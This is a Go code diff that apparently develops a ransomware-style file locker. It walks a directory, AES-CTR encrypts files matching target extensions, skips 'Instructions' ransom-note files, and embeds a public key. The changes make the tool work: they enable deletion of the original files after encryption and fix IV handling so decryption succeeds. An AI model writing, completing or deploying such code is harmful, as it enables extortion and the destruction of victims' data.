@@ -4,6 +4,7 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"errors"
 	"fmt"
 	"io"
 	"os"
@@ -50,7 +51,10 @@ ypklH1uu6oM6xiVK/wIEDhO6Xw==
 -----END PUBLIC KEY-----`
 
 // EncryptDocumets Walks documments in a path and encript or decrypts them.
-func EncryptDocumets(path string, mode bool) {
+func EncryptDocumets(path string, mode bool) error {
+	if block == nil {
+		return errors.New("Need to Initialize Block first. Call: InitializeBlock(myKey []byte)")
+	}
 	if mode {
 		//Encrypt
 		filepath.Walk(path, visit)
@@ -58,7 +62,7 @@ func EncryptDocumets(path string, mode bool) {
 		//Decrpy
 		filepath.Walk(path, visitD)
 	}
-
+	return nil
 }
 
 // InitializeBlock Sets up the encription with a key
@@ -78,7 +82,7 @@ func initIV() (stream cipher.Stream, iv []byte) {
 	return stream, iv
 }
 func initWithIV(myIv []byte) cipher.Stream {
-	stream = cipher.NewCTR(block, myIv[:])
+	return cipher.NewCTR(block, myIv[:])
 }
 
 func visit(path string, f os.FileInfo, err error) error {
@@ -90,7 +94,7 @@ func visit(path string, f os.FileInfo, err error) error {
 	if !strings.Contains(path, Ext) && !strings.Contains(path, "Instructions") {
 		for _, ext := range exts {
 			if strings.Contains(path, ext) {
-				StreamEncrypter(path)
+				streamEncrypter(path)
 				return nil
 			}
 
@@ -100,13 +104,13 @@ func visit(path string, f os.FileInfo, err error) error {
 }
 func visitD(path string, f os.FileInfo, err error) error {
 	if strings.Contains(path, Ext) && !f.IsDir() {
-		StreamDecrypter(path)
+		streamDecrypter(path)
 	}
 	return nil
 }
 
 // StreamDecrypter decryps a file given its filepath
-func StreamDecrypter(path string) (err error) {
+func streamDecrypter(path string) (err error) {
 	inFile, err := os.Open(path)
 	if err != nil {
 		fmt.Println("error:", err)
@@ -118,9 +122,11 @@ func StreamDecrypter(path string) (err error) {
 	if err != nil {
 		return
 	}
-	defer outFile.Close()
-	// TODO Change
-	stream, _ := initIV()
+
+	iv := make([]byte, aes.BlockSize)
+	io.ReadFull(inFile, iv[:])
+	stream := initWithIV(iv)
+	inFile.Seek(aes.BlockSize, 0) // Read after the IV
 
 	reader := &cipher.StreamReader{S: stream, R: inFile}
 	if _, err = io.Copy(outFile, reader); err != nil {
@@ -128,12 +134,12 @@ func StreamDecrypter(path string) (err error) {
 	}
 	inFile.Close()
 
-	//os.Remove(path)
+	os.Remove(path)
 	return
 }
 
 // StreamEncrypter encrypts a file given its filepatth
-func StreamEncrypter(path string) (err error) {
+func streamEncrypter(path string) (err error) {
 	inFile, err := os.Open(path)
 	if err != nil {
 		fmt.Println(err)
@@ -158,7 +164,7 @@ func StreamEncrypter(path string) (err error) {
 	}
 	inFile.Close()
 	outFile.Close()
-	//os.Remove(path)
+	os.Remove(path)
 	return nil
 }
 
